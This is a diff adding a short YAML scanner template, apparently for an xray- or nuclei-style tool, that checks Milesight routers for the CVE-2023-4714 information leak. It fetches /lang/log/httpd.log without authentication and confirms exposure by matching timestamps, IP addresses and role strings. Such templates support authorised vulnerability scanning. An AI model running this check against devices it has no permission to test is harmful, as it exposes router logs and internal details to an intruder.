@@ -1,0 +1,29 @@
+id: poc-yaml-milesight-router-httpdlog-information-leak
+info:
+  name: Milesight Router httpd.log 信息泄漏漏洞(CVE-2023-4714)
+  severity: medium
+  tags:
+  - 信息泄露
+  - CVE-2023-4714
+  finger: Milesight Router
+  fofa: rt_title
+requests:
+- method: GET
+  path: /lang/log/httpd.log
+  headers:
+    Content-Type: application/json
+  expression: 'status_code == 200 &&
+
+    matches(body,"\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}") &&
+
+    matches(body,"\\d+.\\d+.\\d+.\\d+:") &&
+
+    contains(body,"Not Loggined in") &&
+
+    contains(body,"rtver") &&
+
+    contains(body,"ysrole")
+
+    '
+variables: {}
+transport: http
